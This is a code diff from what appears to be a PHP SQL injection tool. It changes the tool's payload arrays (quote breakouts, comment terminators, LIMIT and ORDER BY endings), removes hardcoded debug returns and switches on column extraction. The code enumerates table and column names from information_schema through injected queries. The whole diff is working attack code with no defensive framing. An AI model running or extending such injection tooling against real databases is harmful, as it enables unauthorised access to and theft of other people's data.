@@ -18,7 +18,7 @@
 			private	$_openTag						=	NULL;
 			private	$_closeTag						=	NULL;
 			private	$_fieldPayloads				=	array("","'", "%'","')","%')");
-			private	$_endingPayloads				=	array("ORDER BY 1");
+			private	$_endingPayloads				=	array("LIMIT 1,1", " ORDER BY 1", "LIMIT 1,1 ORDER BY 1");
 			private	$_commentPayloads				=	array("/*","--","#");
 			private	$_currFieldPayload			=	NULL;
 			private	$_currTerminatingPayload	=	NULL;
@@ -280,8 +280,6 @@
 
 			public function getOpenTag(){
 
-				return "9e99";
-
 				if(!empty($this->_openTag)){
 					return $this->_openTag;
 				}
@@ -294,8 +292,6 @@
 
 
 			public function getCloseTag(){
-
-				return "9e99";
 
 				if(!empty($this->_closeTag)){
 					return $this->_closeTag;
@@ -461,17 +457,17 @@
 
 					$this->log("Performing table extraction one by one",2,"yellow");
 
-					$limit									=	0;
+					$limit									=	1;
 					$select									=	"TABLE_NAME";
 					$from										=	"FROM information_schema.tables WHERE table_schema=DATABASE()";
 
-					$this->_currTerminatingPayload	=	"ORDER BY ".$this->_affectedField." LIMIT ".$limit++.",1";
+					$this->_currTerminatingPayload	=	"LIMIT ".$limit++.",1";
 
 					while($table	=	$this->execute($select,$from)){
 
-						$this->log("Discovered table $table!",0,"light_purple");
-						
-						$restoreTPayLoad	=	$this->_currTerminatingPayload	=	"ORDER BY ".$this->_affectedField." LIMIT ".$limit++.",1";
+						$this->log("Discovered table $table!",0,"light_cyan");
+
+						$restoreTPayLoad	=	$this->_currTerminatingPayload	=	"LIMIT ".$limit++.",1";
 
 						//Add just the table to the table to the DatabaseSchema Object
 						//Columns are retrieved from the runner, this is just because some people
@@ -482,13 +478,14 @@
 
 					}
 
+
 				}else{	//no data trunking, everything cool
 
 					$tables	=	explode(',',$tables);
 
 					foreach($tables as $table){
 
-						$dbSchema->addTable($table,array());
+						$dbSchema->addTable($table,$this->getColumns($table));
 
 					}
 
@@ -517,7 +514,7 @@
 														"AND table_name=".\String::hexEncode($table);
 
 				$restoreTerminatingPayload	=	$this->_currTerminatingPayload;
-				$this->_currTerminatingPayload	=	"ORDER BY ".$this->_affectedField;
+				$this->_currTerminatingPayload	=	"LIMIT 1,1";
 
 				$tableFields	=	$this->execute($select,$from);
 
@@ -531,7 +528,7 @@
 
 					while($field	=	$this->execute($select,$from)){
 
-						$this->_currTerminatingPayload	=	"ORDER BY ".$this->_affectedField." LIMIT ".$limit.",1";
+						$this->_currTerminatingPayload	=	"LIMIT ".$limit.",1";
 						$limit++;
 						$tableFields[]	=	$field;
 
